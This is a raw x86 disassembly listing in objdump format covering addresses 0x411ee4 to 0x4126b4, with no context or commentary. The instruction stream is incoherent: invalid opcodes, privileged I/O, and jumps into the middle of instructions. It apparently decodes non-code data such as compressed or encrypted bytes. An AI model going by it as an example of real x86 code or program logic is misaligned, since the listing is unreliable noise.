  411ee4:	xor    al,BYTE PTR ds:[ebx]
  411ee7:	xchg   esi,eax
  411ee8:	push   0xffffffc4
  411eea:	je     0x411ec0
  411eec:	ret    0x155d
  411eef:	outs   dx,DWORD PTR ds:[esi]
  411ef0:	jl     0x411f12
  411ef2:	or     ebx,edx
  411ef4:	cmp    eax,0xf8194cf7
  411ef9:	or     DWORD PTR ds:0xfe0e16bb,edi
  411eff:	mov    ch,0x40
  411f01:	in     al,dx
  411f02:	imul   ebx,DWORD PTR [edi-0x6dd249b],0x8f7e63f
  411f0c:	xchg   ecx,eax
  411f0d:	sbb    DWORD PTR [esi],eax
  411f0f:	ins    DWORD PTR es:[edi],dx
  411f10:	nop
  411f11:	jbe    0x411f00
  411f13:	in     al,0x3f
  411f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f17:	mov    eax,DWORD PTR [ecx-0x259405f]
  411f1d:	pusha  
  411f1e:	pushf  
  411f1f:	lea    esi,[ecx+eax*4-0x30712864]
  411f26:	(bad)  
  411f27:	fstp   QWORD PTR [eax+0x12b6e05f]
  411f2d:	add    eax,0xbb71a1e4
  411f32:	dec    esi
  411f33:	rcr    ebx,cl
  411f35:	cmp    DWORD PTR [edx],ebx
  411f37:	aas    
  411f38:	outs   dx,DWORD PTR ds:[esi]
  411f39:	mov    edx,edx
  411f3b:	pop    ss
  411f3c:	js     0x411f0d
  411f3e:	xchg   edi,eax
  411f3f:	push   esp
  411f40:	cli    
  411f41:	pop    edx
  411f42:	sbb    DWORD PTR [edi],0x64
  411f45:	jb     0x411f91
  411f47:	(bad)  
  411f49:	mov    eax,0xea2bc61d
  411f4e:	hlt    
  411f4f:	aad    0x5d
  411f51:	loopne 0x411f44
  411f53:	sbb    al,0xdf
  411f55:	imul   eax,DWORD PTR [edx-0x38],0x76
  411f59:	pop    ds
  411f5a:	ins    BYTE PTR es:[edi],dx
  411f5b:	mov    ds:0x795ffd30,eax
  411f60:	popa   
  411f61:	push   edi
  411f62:	push   esi
  411f63:	ret    0x13b7
  411f66:	xlat   BYTE PTR ds:[ebx]
  411f67:	fnstenv [ebx-0x60]
  411f6a:	xlat   BYTE PTR ds:[ebx]
  411f6b:	jmp    esp
  411f6d:	pushf  
  411f6e:	mov    eax,0x8f7263c5
  411f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f74:	push   ebx
  411f75:	fcom   DWORD PTR [esi]
  411f77:	xor    dh,dl
  411f79:	lahf   
  411f7a:	mov    ecx,0x30a4e133
  411f7f:	xchg   edx,eax
  411f80:	push   ss
  411f81:	pop    eax
  411f82:	add    dh,BYTE PTR [edi-0x62]
  411f85:	ss loope 0x411fcc
  411f88:	push   0xdb922f63
  411f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f8e:	pushf  
  411f8f:	add    DWORD PTR [edi],esp
  411f91:	pop    esp
  411f92:	les    esp,FWORD PTR [ebp-0x3a]
  411f95:	pushf  
  411f96:	in     al,dx
  411f97:	mov    BYTE PTR [ebx],dh
  411f99:	or     eax,0xf88714d8
  411f9e:	adc    al,0xb1
  411fa0:	inc    DWORD PTR ds:0x5ef6d4ee
  411fa6:	or     ah,BYTE PTR [ecx+edx*8+0x4c196cd]
  411fad:	mov    bh,0x15
  411faf:	ja     0x411f85
  411fb1:	out    0x5a,al
  411fb3:	pop    edi
  411fb4:	ret    
  411fb5:	imul   ebx,DWORD PTR [eax+0x4ecd168b],0xffffffe1
  411fbc:	outs   dx,DWORD PTR ds:[esi]
  411fbd:	sbb    esp,DWORD PTR [ebx-0x638b406f]
  411fc3:	sub    eax,0x89bee87e
  411fc8:	lods   eax,DWORD PTR ds:[esi]
  411fc9:	fnstenv [esi-0x18]
  411fcc:	(bad)  
  411fcd:	inc    ah
  411fcf:	dec    eax
  411fd0:	pminsw mm4,QWORD PTR [ebx]
  411fd3:	aam    0xc3
  411fd5:	sar    BYTE PTR [edx-0x7d],0xb
  411fd9:	push   edi
  411fda:	ins    BYTE PTR es:[edi],dx
  411fdb:	cmp    al,0xbd
  411fdd:	push   edi
  411fde:	rcl    edx,cl
  411fe0:	inc    ebp
  411fe1:	mov    esi,0x783cfd2c
  411fe6:	adc    DWORD PTR [ebp-0x9],0xdb1580cf
  411fed:	mov    eax,DWORD PTR [ebp-0x2e9e7f44]
  411ff3:	fiadd  DWORD PTR [ebp+0x55d6c118]
  411ff9:	sbb    eax,0x58dee6a9
  411ffe:	xor    ch,BYTE PTR [ebx]
  412000:	jecxz  0x411fc4
  412002:	stos   BYTE PTR es:[edi],al
  412003:	mul    BYTE PTR ds:0xba6ea818
  412009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41200a:	sub    eax,0xfe647ac7
  41200f:	jecxz  0x411fcf
  412011:	pop    ecx
  412012:	into   
  412013:	mov    bl,0x14
  412015:	enter  0xb4b8,0x5b
  412019:	add    DWORD PTR [edi+0x70],edi
  41201c:	cmp    DWORD PTR [ebx+0x432ee057],ebp
  412022:	push   ecx
  412023:	(bad)  
  412024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412025:	inc    edx
  412026:	les    eax,FWORD PTR [ecx+0x43fc5dc7]
  41202c:	jle    0x412093
  41202e:	outs   dx,DWORD PTR ds:[esi]
  41202f:	fnstenv [eax+0x7d489f5e]
  412035:	sub    ebp,DWORD PTR [eax+0x1a39dd8c]
  41203b:	mov    cl,0xe5
  41203d:	mul    ebp
  41203f:	adc    cl,BYTE PTR [ebx-0x3c]
  412042:	mov    ebx,DWORD PTR [edi-0x72]
  412045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412046:	jmp    0xc6df:0xb378da9f
  41204d:	dec    ebp
  41204e:	ja     0x412096
  412050:	push   cs
  412051:	adc    bh,BYTE PTR ds:0xf5777a7b
  412057:	les    edx,FWORD PTR [ebp+esi*4+0x37]
  41205b:	mov    ch,0x45
  41205d:	or     ch,BYTE PTR ds:0xe108035
  412063:	or     DWORD PTR [ebx+0x6f],ebx
  412066:	das    
  412067:	and    al,0x97
  41206a:	ret    
  41206b:	leave  
  41206c:	test   eax,0x762bfe2e
  412071:	push   edx
  412072:	push   eax
  412073:	sbb    BYTE PTR [eax-0x3f],cl
  412076:	outs   dx,DWORD PTR ds:[esi]
  412077:	dec    esp
  412078:	cmp    al,0x40
  41207a:	mov    ebp,0xe3137bc8
  41207f:	test   DWORD PTR [eax+0x2a05f23d],edx
  412085:	lds    ebp,FWORD PTR [edi]
  412087:	imul   edx,DWORD PTR [ebp-0xd6910f7],0x79c243e0
  412091:	popa   
  412092:	nop
  412093:	sbb    eax,DWORD PTR [ebp+0x7ae22d1a]
  412099:	ss and esi,edx
  41209c:	xor    eax,0xa6bb1633
  4120a1:	push   edi
  4120a2:	mov    DWORD PTR [edi+0x506e9d1],eax
  4120a8:	add    BYTE PTR [eax],al
  4120aa:	cmp    al,0x3f
  4120ac:	mov    al,0xc9
  4120af:	(bad)
  4120b2:	cmc    
  4120b3:	add    esi,esp
  4120b5:	inc    edx
  4120b6:	adc    BYTE PTR [ebx+0x3c2ffb2],dh
  4120bc:	jg     0x412136
  4120be:	push   0x7c
  4120c0:	js     0x41213a
  4120c2:	push   0x1f
  4120c4:	icebp  
  4120c5:	ins    DWORD PTR es:[edi],dx
  4120c6:	push   ds
  4120c7:	ror    BYTE PTR [ebx+0x74],1
  4120ca:	stos   DWORD PTR es:[edi],eax
  4120cb:	test   DWORD PTR [ecx+0x4ba4712f],edi
  4120d1:	xlat   BYTE PTR ds:[ebx]
  4120d2:	or     al,0xb6
  4120d4:	ss ja  0x412135
  4120d7:	cmp    DWORD PTR [eax],edx
  4120d9:	rol    BYTE PTR [edx],cl
  4120db:	test   DWORD PTR [edx-0x3c],eax
  4120de:	mov    ds:0xd08cad33,eax
  4120e3:	mov    esp,0x1742034
  4120e8:	out    dx,eax
  4120e9:	in     al,dx
  4120ea:	les    eax,FWORD PTR [eax+0x67]
  4120ed:	icebp  
  4120ee:	pop    ds
  4120ef:	clc    
  4120f0:	fmul   DWORD PTR [edx-0x52c19bdf]
  4120f6:	pop    ebx
  4120f7:	test   al,0x9a
  4120f9:	in     eax,dx
  4120fa:	cmp    DWORD PTR [edi],0x58
  4120fd:	mov    WORD PTR [edi+0x594e3e9c],cs
  412103:	addr16 call 0x7f5:0xd77f23f8
  41210b:	fisttp WORD PTR [edx+eax*1-0x321d5800]
  412112:	and    dh,bh
  412114:	mov    edx,0x3a74c620
  412119:	jnp    0x4120d0
  41211b:	push   es
  41211c:	xchg   ebx,eax
  41211d:	popf   
  41211e:	bound  eax,QWORD PTR [eax-0x68]
  412121:	ss cs retf 
  412124:	(bad)  
  412125:	pop    ecx
  412126:	push   ebx
  412127:	lds    edi,FWORD PTR [ecx]
  412129:	sub    al,BYTE PTR [edx+ebx*8+0x3f]
  41212d:	aam    0xf6
  41212f:	and    eax,0xd4cf1d51
  412134:	fsub   QWORD PTR [ebx]
  412136:	dec    ecx
  412137:	rol    bh,cl
  412139:	js     0x4121aa
  41213b:	pop    esi
  41213c:	push   ecx
  41213d:	dec    ebx
  41213e:	cmp    cl,ah
  412140:	call   0xc94c27cf
  412145:	enter  0x84ea,0x89
  412149:	and    BYTE PTR [ecx],dl
  41214b:	sbb    esi,DWORD PTR [ebx+0x390793f4]
  412151:	ror    DWORD PTR [ebx],0x82
  412154:	jmp    0xd06c8675
  412159:	jge    0x412193
  41215b:	addr16 loopne 0x41212a
  41215e:	jnp    0x412162
  412160:	or     eax,0x294f5b2b
  412165:	inc    esp
  412166:	mov    edx,0x4976e27e
  41216b:	mov    al,0x89
  41216d:	loopne 0x4121dc
  41216f:	jne    0x412186
  412171:	pop    ss
  412172:	stos   DWORD PTR es:[edi],eax
  412173:	and    eax,0x79b19ae5
  412178:	add    al,0x6a
  41217a:	push   ss
  41217b:	sbb    BYTE PTR [esi-0x1fdd3acb],dl
  412181:	mov    ah,0x50
  412183:	dec    ebp
  412184:	push   es
  412185:	dec    edi
  412186:	int3   
  412187:	dec    ecx
  412188:	xchg   ecx,eax
  412189:	out    dx,eax
  41218a:	jl     0x412204
  41218c:	popa   
  41218d:	out    0xc7,eax
  41218f:	cmp    cl,al
  412191:	retf   0x8152
  412194:	adc    dh,BYTE PTR [esi-0x2a]
  412197:	xor    DWORD PTR [ebp+0x71],ecx
  41219a:	outs   dx,DWORD PTR ds:[esi]
  41219b:	test   al,0x37
  41219d:	popa   
  41219e:	mov    ds:0xfa82556c,al
  4121a3:	rcl    DWORD PTR [eax+0x4e9679],cl
  4121a9:	out    0x4d,al
  4121ab:	imul   ebx,DWORD PTR [eax+0x2a],0x7e9b831f
  4121b2:	mov    esp,fs
  4121b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121b5:	lea    eax,[ebx]
  4121b7:	or     DWORD PTR [esi],ebp
  4121b9:	xor    al,0xc4
  4121bb:	not    BYTE PTR [ebx+0x5b]
  4121be:	inc    ebp
  4121bf:	cld    
  4121c0:	sub    DWORD PTR es:[ebx-0x23fd08d9],ebx
  4121c7:	lgs    eax,FWORD PTR [eax+0x501aae08]
  4121ce:	addr16 push ss
  4121d0:	lods   eax,DWORD PTR ds:[esi]
  4121d1:	jge    0x412202
  4121d3:	mov    dh,0x6c
  4121d5:	lods   al,BYTE PTR ds:[esi]
  4121d6:	jmp    0x8481b401
  4121db:	lea    edi,[ecx+0x235f673a]
  4121e1:	or     al,0x5a
  4121e3:	call   0xf509:0xeb74ad5f
  4121ea:	cld    
  4121eb:	jp     0x4121f3
  4121ed:	ret    0xab9
  4121f0:	add    DWORD PTR [esi+0xd],0xfffffff9
  4121f4:	push   dx
  4121f6:	rol    BYTE PTR [esi+0x79],1
  4121f9:	sub    ebx,esp
  4121fb:	lock adc esi,ecx
  4121fe:	adc    eax,0x26c22a5c
  412203:	sbb    al,0xee
  412205:	aaa    
  412206:	xchg   ecx,eax
  412207:	stos   BYTE PTR es:[edi],al
  412208:	lds    esp,FWORD PTR [ecx]
  41220a:	push   ebp
  41220b:	fild   DWORD PTR [edx-0x75]
  41220e:	xor    bl,ah
  412210:	or     BYTE PTR [edi],bh
  412212:	or     DWORD PTR [esi],esp
  412214:	je     0x4121d8
  412216:	fadd   QWORD PTR [esi-0x78c98069]
  41221c:	mov    cl,0x7a
  41221e:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  412220:	enter  0xadb0,0xf4
  412224:	mov    bl,bh
  412226:	mov    DWORD PTR ds:0x3f3df111,0xe9f274b4
  412230:	(bad)  
  412231:	jle    0x4121c5
  412233:	fbstp  TBYTE PTR ds:0x7ae1fed1
  412239:	(bad)  
  41223a:	cmp    al,0x97
  41223c:	and    al,0xad
  41223e:	aad    0x8d
  412240:	sar    BYTE PTR [ebx],cl
  412242:	call   0x1553b85b
  412247:	xor    esp,DWORD PTR ds:0x2baa8bfc
  41224d:	std    
  41224e:	push   esi
  41224f:	jmp    0x6eaf:0x2488d339
  412256:	xor    al,BYTE PTR [eax+0x7997680b]
  41225c:	sub    eax,ebp
  41225e:	ss jg  0x412285
  412261:	addr16 mov ch,0x1a
  412264:	jns    0x4122b1
  412266:	or     al,0xb5
  412268:	lahf   
  412269:	mul    BYTE PTR [ebp-0xcaf9c2e]
  41226f:	mov    DWORD PTR [eax],esp
  412271:	xchg   edx,eax
  412272:	(bad)  
  412273:	mov    ebp,0xa952958c
  412278:	cmp    esp,DWORD PTR [esi+0x362bc22d]
  41227e:	and    ch,bh
  412280:	cwde   
  412281:	sub    ah,BYTE PTR [eax]
  412283:	add    ebp,DWORD PTR [ebp-0x70a31a3b]
  412289:	mov    esp,0xc249513a
  41228e:	mov    dl,0x88
  412290:	cmc    
  412291:	xchg   ebx,eax
  412292:	pop    esi
  412293:	ss (bad) 
  412295:	scas   eax,DWORD PTR es:[edi]
  412296:	xchg   esi,eax
  412297:	dec    ebx
  412298:	rol    DWORD PTR ds:0xdda657c,cl
  41229e:	cmc    
  41229f:	push   cs
  4122a0:	retf   
  4122a1:	xchg   DWORD PTR [edx],ebp
  4122a3:	or     DWORD PTR [edi-0x5ebe902f],0x69
  4122aa:	pop    eax
  4122ab:	mov    bh,BYTE PTR [ecx-0x2b49cd98]
  4122b1:	ret    
  4122b2:	sar    BYTE PTR [esi+0x62],1
  4122b5:	shl    BYTE PTR [di+0xb],1
  4122b9:	ins    BYTE PTR es:[edi],dx
  4122ba:	mov    al,ds:0xde359365
  4122bf:	push   es
  4122c0:	xor    edi,DWORD PTR [ebp+0x38]
  4122c3:	xor    eax,0x79ed4494
  4122c8:	adc    DWORD PTR fs:[ebx+0x8],ebp
  4122cc:	and    ecx,DWORD PTR [esi]
  4122ce:	pop    ss
  4122cf:	pop    ecx
  4122d0:	adc    eax,0x1144800a
  4122d5:	fnstcw WORD PTR [edx+ebx*1]
  4122d8:	rcr    BYTE PTR [eax+0x3d],0xae
  4122dc:	push   0xf793d728
  4122e1:	clc    
  4122e2:	jns    0x412340
  4122e4:	dec    esi
  4122e5:	mov    DWORD PTR [eax+0x4b],ebx
  4122e8:	retf   0x82e0
  4122eb:	push   0xd2ca8e
  4122f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122f1:	stos   BYTE PTR es:[edi],al
  4122f2:	or     BYTE PTR [esi-0x1a],bl
  4122f5:	cmp    DWORD PTR [ebp+0x472aa630],esp
  4122fb:	and    ebp,DWORD PTR [ebx]
  4122fd:	mov    eax,ds:0xa248c7d
  412302:	or     ch,0x8
  412305:	pusha  
  412306:	ds push esi
  412308:	jecxz  0x4122db
  41230a:	mov    ebp,edx
  41230c:	stc    
  41230d:	mov    al,0x43
  41230f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412310:	mov    al,ds:0x43c4a9a1
  412315:	pop    esp
  412316:	jae    0x41236e
  412318:	sbb    esp,eax
  41231a:	div    BYTE PTR [esp+edx*4+0x52]
  41231e:	push   eax
  41231f:	sahf   
  412320:	jle    0x41234f
  412322:	pop    ss
  412323:	fld    DWORD PTR [eax]
  412325:	jge    0x412315
  412327:	je     0x412397
  412329:	jmp    0x4122f8
  41232b:	sub    BYTE PTR [edi+0x12e045bf],0x38
  412332:	dec    ebx
  412333:	out    dx,eax
  412334:	push   ss
  412335:	icebp  
  412336:	inc    ecx
  412337:	loop   0x412328
  412339:	(bad)  
  41233b:	push   ebx
  41233c:	lods   eax,DWORD PTR ds:[esi]
  41233d:	push   esi
  41233e:	jmp    0x4123bc
  412340:	int    0x89
  412342:	pop    edi
  412343:	push   ebp
  412344:	mov    al,ds:0xc7a3e5af
  412349:	js     0x41236f
  41234b:	adc    al,0x46
  41234d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41234e:	or     ch,cl
  412350:	pop    eax
  412351:	jg     0x412395
  412353:	push   ebp
  412354:	pop    edx
  412355:	cdq    
  412356:	push   DWORD PTR [eax+eax*2-0x2d118a0d]
  41235d:	psubsw mm4,QWORD PTR [ebx]
  412360:	dec    ebx
  412361:	(bad)  
  412362:	int3   
  412363:	dec    esi
  412364:	dec    ebx
  412365:	out    0xe2,al
  412367:	push   ebx
  412368:	sahf   
  412369:	xchg   ecx,eax
  41236a:	push   esp
  41236b:	mov    edi,0xc348dfa2
  412370:	imul   ecx,DWORD PTR [edx+eiz*8],0x21
  412374:	retf   
  412375:	loope  0x4123ac
  412377:	lock neg DWORD PTR [edi+0x6a]
  41237b:	sub    edx,DWORD PTR [edi-0x2809ef8d]
  412381:	outs   dx,DWORD PTR ds:[esi]
  412382:	jecxz  0x412383
  412384:	sbb    bl,BYTE PTR [eax+esi*4-0x70]
  412388:	push   ebx
  412389:	scas   eax,DWORD PTR es:[edi]
  41238a:	fs pusha 
  41238c:	dec    ebp
  41238d:	les    eax,FWORD PTR [ecx]
  41238f:	push   ebx
  412390:	sbb    DWORD PTR [esi],ebp
  412392:	inc    edi
  412393:	pop    eax
  412394:	rcr    DWORD PTR [edx+ecx*8],cl
  412397:	dec    ebp
  412398:	or     eax,0xecf9f0df
  41239d:	jle    0x41237e
  41239f:	fwait
  4123a0:	arpl   WORD PTR [esi],si
  4123a2:	mov    al,ds:0xfcb1832c
  4123a7:	jmp    0x412376
  4123a9:	lea    ebp,[edx+0x5b]
  4123ac:	xchg   edx,eax
  4123ad:	stos   BYTE PTR es:[edi],al
  4123ae:	jb     0x412339
  4123b0:	jnp    0x412395
  4123b2:	mov    ch,0xfa
  4123b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123b5:	fmul   QWORD PTR [esi+0x44]
  4123b8:	dec    edx
  4123b9:	pop    ebp
  4123ba:	push   edi
  4123bb:	add    ebx,esp
  4123bd:	xor    eax,0x651a9750
  4123c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123c4:	mov    ds:0xc9a474a8,eax
  4123c9:	push   ss
  4123ca:	ror    BYTE PTR [esi+0x7367e09e],1
  4123d0:	ds push esi
  4123d2:	inc    ebx
  4123d3:	jo     0x412367
  4123d5:	add    BYTE PTR [edi],cl
  4123d7:	lahf   
  4123d8:	xchg   ebx,eax
  4123d9:	mov    eax,0x78027e2f
  4123de:	xchg   ebp,eax
  4123df:	sbb    bh,BYTE PTR [edi]
  4123e1:	dec    eax
  4123e2:	pusha  
  4123e3:	test   eax,0xf298fda
  4123e8:	dec    ebx
  4123e9:	arpl   WORD PTR [edi+0x17],si
  4123ec:	or     eax,DWORD PTR [ecx]
  4123ee:	test   DWORD PTR [eax-0x5b],0xfadb3a28
  4123f5:	fs mov ebx,0xe215086f
  4123fb:	xor    DWORD PTR [edx],eax
  4123fd:	inc    esi
  4123fe:	jno    0x412460
  412400:	test   DWORD PTR [esi],edx
  412402:	loop   0x412450
  412404:	fadd   DWORD PTR [ebx]
  412406:	xlat   BYTE PTR ds:[ebx]
  412407:	test   DWORD PTR [esi-0x4f],0x81c11fcc
  41240e:	adc    esp,ebp
  412410:	inc    esp
  412411:	mov    ebp,0x5c75f189
  412416:	test   DWORD PTR [ebx-0x159ad18],edx
  41241c:	nop
  41241d:	add    DWORD PTR [esi+0x67156730],edx
  412423:	push   ebp
  412424:	mov    al,ds:0x3c2bb6af
  412429:	shl    DWORD PTR ds:0x1412f7a1,0xcc
  412430:	mov    ah,0x1a
  412432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412433:	adc    eax,0x93537d62
  412438:	cmp    BYTE PTR [esi-0x64f2d4ed],0x63
  41243f:	shl    DWORD PTR [ebx],cl
  412441:	pop    eax
  412442:	fs mov ch,0x57
  412445:	mov    dh,0xbd
  412447:	pop    ebx
  412448:	cwde   
  412449:	loopne 0x41244e
  41244b:	repz and dh,BYTE PTR [ebx]
  41244e:	ficom  WORD PTR [edx+0x27]
  412451:	loope  0x412495
  412453:	mov    eax,ds:0x414ebbf1
  412458:	dec    ebp
  412459:	pop    ds
  41245a:	out    dx,al
  41245b:	xchg   ebp,eax
  41245c:	xchg   ebx,eax
  41245d:	fcomp  st(2)
  41245f:	es pop es
  412461:	mov    WORD PTR [edi+0x2c],cs
  412464:	push   edx
  412465:	add    al,0x5f
  412467:	cdq    
  412468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412469:	inc    ecx
  41246a:	fdiv   DWORD PTR [edi+0x50]
  41246d:	mov    edi,0x38d9d6ba
  412472:	fwait
  412473:	mov    al,ds:0x804625c7
  412478:	cli    
  412479:	js     0x412425
  41247b:	jecxz  0x412453
  41247d:	sub    cl,BYTE PTR [ebx]
  41247f:	cmp    ebx,DWORD PTR [ebx-0x432224fe]
  412485:	imul   edi,DWORD PTR [ecx-0x9],0xe8caca36
  41248c:	or     BYTE PTR [ebx-0x60447fe3],al
  412492:	mov    bh,dh
  412494:	in     al,0x49
  412496:	out    dx,al
  412497:	call   0x52401cfd
  41249c:	aam    0x2
  41249e:	inc    esi
  41249f:	data16 scas al,BYTE PTR es:[edi]
  4124a1:	aad    0xc8
  4124a3:	cwde   
  4124a4:	aad    0xd6
  4124a6:	lock and DWORD PTR [edi-0x62],esi
  4124aa:	loopne 0x412474
  4124ac:	inc    esp
  4124ad:	lock push ss
  4124af:	test   BYTE PTR [edx],0xac
  4124b2:	sbb    edx,DWORD PTR [eax-0x69]
  4124b5:	mov    eax,ds:0xd004f873
  4124ba:	mov    cl,0x5c
  4124bc:	sti    
  4124bd:	in     eax,dx
  4124be:	add    BYTE PTR [edi+ebx*8+0x26c8c6e9],bh
  4124c5:	jmp    0x451bb63d
  4124ca:	cmp    ah,ah
  4124cc:	and    BYTE PTR [eax+0x1102e24d],0x50
  4124d3:	mov    dl,BYTE PTR [ecx+0x55]
  4124d6:	lds    ebx,FWORD PTR [esi-0x386d437c]
  4124dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124dd:	push   ds
  4124de:	xor    eax,0xe4c61ec4
  4124e3:	xor    edx,eax
  4124e5:	mov    dl,0x67
  4124e7:	lds    ecx,FWORD PTR [eax]
  4124e9:	push   ds
  4124ea:	mov    esp,0xe803bb6d
  4124ef:	cwde   
  4124f0:	and    al,0x36
  4124f3:	out    dx,al
  4124f4:	dec    ebx
  4124f5:	inc    ecx
  4124f6:	bound  eax,QWORD PTR [ebp+0x8ea7c65]
  4124fc:	mov    ds:0xc96cf09d,eax
  412501:	xor    esp,DWORD PTR [ebx-0x4c]
  412504:	scas   eax,DWORD PTR es:[edi]
  412505:	add    al,0xdc
  412507:	call   0xea95:0xa02e0eda
  41250e:	mov    ecx,DWORD PTR ds:0xec48ada3
  412514:	je     0x412556
  412516:	std    
  412517:	ret    
  412518:	imul   edi,DWORD PTR [eax],0x7488f561
  41251e:	sub    al,0xb
  412520:	sub    dh,BYTE PTR [edx+0x3b]
  412523:	mov    esi,0xeb573dcb
  412528:	dec    esp
  412529:	add    eax,0x9ce27e07
  41252e:	fidiv  WORD PTR [ebx+0x5d4baf55]
  412534:	add    esi,DWORD PTR [ebp-0x5d11ad43]
  41253a:	xchg   ecx,eax
  41253b:	ror    bl,cl
  41253d:	stc    
  41253e:	push   0xffffffdf
  412540:	xchg   DWORD PTR [edx+0x4439f86c],edi
  412546:	xchg   DWORD PTR [ebx+0x39],edx
  412549:	push   es
  41254a:	sub    ch,BYTE PTR [ebx+0x285ce880]
  412550:	mov    ecx,0x86f906ea
  412555:	or     BYTE PTR [ebx-0x499d03cb],ch
  41255b:	sbb    bl,BYTE PTR [edx+0x5c]
  41255e:	add    ch,BYTE PTR [edi+0x4]
  412561:	mov    ah,0x9
  412563:	mov    ah,0xc
  412565:	pop    ss
  412566:	xchg   edi,eax
  412567:	xor    eax,0x36344454
  41256c:	stc    
  41256d:	sbb    eax,0xe6359f5b
  412572:	and    eax,0x97edb0a5
  412577:	pop    ecx
  412578:	jnp    0x4125ac
  41257a:	xchg   edi,eax
  41257b:	inc    ecx
  41257c:	(bad)  
  41257d:	adc    BYTE PTR [edx-0x18],al
  412580:	xor    al,BYTE PTR [ebx-0x6c]
  412583:	aas    
  412584:	adc    esi,DWORD PTR [ecx-0x3c]
  412587:	out    dx,al
  412588:	pop    esp
  412589:	outs   dx,DWORD PTR ds:[esi]
  41258a:	pop    edx
  41258b:	inc    esp
  41258c:	inc    eax
  41258d:	push   ebx
  41258e:	sbb    BYTE PTR [eax-0x7a84a196],dh
  412594:	xchg   edi,eax
  412595:	mov    eax,ds:0x70d50a5d
  41259a:	cmp    DWORD PTR [ebx+0xd],esp
  41259d:	fstp   TBYTE PTR [edx]
  41259f:	mov    bh,0x4b
  4125a1:	stos   DWORD PTR es:[edi],eax
  4125a2:	jmp    0x5ad7:0xe9372630
  4125a9:	sbb    ecx,DWORD PTR [ebx-0x60]
  4125ac:	outs   dx,BYTE PTR ds:[esi]
  4125ad:	xor    ebp,DWORD PTR [edx+eax*4-0x2]
  4125b1:	or     ch,cl
  4125b3:	push   es
  4125b4:	add    eax,0xd23e0000
  4125b9:	aas    
  4125ba:	ret    0xd1d3
  4125bd:	rcl    edx,0xcb
  4125c0:	mov    ch,0x79
  4125c2:	or     eax,0xa61c91e4
  4125c7:	sub    al,0x6
  4125c9:	jg     0x412643
  4125cb:	push   0x7c
  4125cd:	js     0x412647
  4125cf:	xchg   edi,eax
  4125d0:	fstp   TBYTE PTR [ecx+eax*8+0x39]
  4125d4:	push   esi
  4125d5:	mov    ecx,0xc7886c87
  4125da:	push   edi
  4125db:	xor    DWORD PTR [eax],eax
  4125dd:	pop    ss
  4125de:	pop    eax
  4125df:	mov    WORD PTR [esi-0x599c69c4],ds
  4125e5:	rol    BYTE PTR [edi+0x67],1
  4125e8:	push   ds
  4125e9:	push   esp
  4125ea:	sti    
  4125eb:	inc    ecx
  4125ec:	outs   dx,BYTE PTR ds:[esi]
  4125ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125ee:	sbb    ebx,DWORD PTR [ebx+ebp*8+0x5]
  4125f2:	mov    ebx,0xce7d6ab8
  4125f7:	jmp    0x33549c09
  4125fc:	mov    edx,0x77325ba9
  412601:	out    0xe4,al
  412603:	adc    BYTE PTR ds:0x9cdf057f,dh
  412609:	test   BYTE PTR [ebp+0x2d4eb7c],dl
  41260f:	(bad)  
  412610:	(bad)  
  412611:	stos   BYTE PTR es:[edi],al
  412612:	cdq    
  412613:	push   ebp
  412614:	mov    dl,0x9b
  412616:	dec    esp
  412617:	sbb    ebp,DWORD PTR [ebp+edx*4-0x55]
  41261b:	sbb    eax,0x182b1436
  412620:	ins    DWORD PTR es:[edi],dx
  412621:	rcl    BYTE PTR [edx+0x73],0x11
  412625:	fstp   DWORD PTR [ecx+0x44df460b]
  41262b:	jle    0x412639
  41262d:	popa   
  41262e:	test   DWORD PTR [edi+0x7e9979dd],esp
  412634:	dec    esi
  412635:	sar    BYTE PTR [esi-0x65],cl
  412638:	mov    esi,eax
  41263a:	adc    eax,0xbe86f0d4
  41263f:	mov    eax,0x8a74459c
  412644:	inc    ecx
  412645:	inc    edx
  412646:	push   edi
  412647:	cmp    al,0x1d
  412649:	push   0x308425b9
  41264e:	in     eax,dx
  41264f:	or     BYTE PTR [ecx],cl
  412651:	push   es
  412652:	or     ecx,DWORD PTR [esi+0x4a]
  412655:	dec    eax
  412656:	and    dl,BYTE PTR [ebp+0x530a097e]
  41265c:	xchg   esp,edx
  41265e:	adc    ebx,DWORD PTR [ebx-0x1b]
  412661:	xor    edx,DWORD PTR [ecx-0x1af7296c]
  412667:	test   al,0xc
  412669:	scas   al,BYTE PTR es:[edi]
  41266a:	das    
  41266b:	dec    edx
  41266c:	scas   al,BYTE PTR es:[edi]
  41266d:	ja     0x412616
  41266f:	fnstsw WORD PTR [esi-0x7c]
  412672:	les    esp,FWORD PTR [ebx-0x1f6e3b0b]
  412678:	add    ah,BYTE PTR [eax]
  41267a:	xor    DWORD PTR [esi-0x3a3361a4],ebp
  412680:	sub    cl,BYTE PTR [edx-0x57469b6]
  412686:	or     eax,0x813307c3
  41268b:	cdq    
  41268c:	dec    ecx
  41268d:	das    
  41268e:	ficom  WORD PTR [ebx+ebx*8-0x76]
  412692:	push   es
  412693:	out    0xe1,al
  412695:	sub    ebp,ebp
  412697:	mov    edi,0x2ccd512b
  41269c:	stos   BYTE PTR es:[edi],al
  41269d:	mov    esp,0xabdccc19
  4126a2:	mov    esp,0xac4a6587
  4126a7:	ret    0x5838
  4126aa:	mov    ebx,0xe02bddc9
  4126af:	test   DWORD PTR [ebp-0x5b],eax
  4126b2:	xor    ch,dh
  4126b4:	jecxz  0x412665
